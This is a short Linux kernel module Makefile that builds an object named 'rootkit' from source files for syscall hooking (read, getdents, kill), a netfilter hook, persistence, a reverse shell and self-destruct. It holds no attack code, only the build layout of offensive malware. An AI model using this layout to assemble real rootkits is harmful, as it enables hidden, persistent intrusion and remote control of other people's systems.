clean:
	-rm *.o *.mod.c *.symvers *.ko *.mod *.order 

obj-m := rootkit.o 
rootkit-objs += src/hooking.o src/hooked_funcs/h_read.o src/hooked_funcs/h_getdents.o src/hooked_funcs/h_kill.o src/module.o src/persistence.o src/revshell.o src/hooked_funcs/h_netfilter.o src/selfdestruct.o
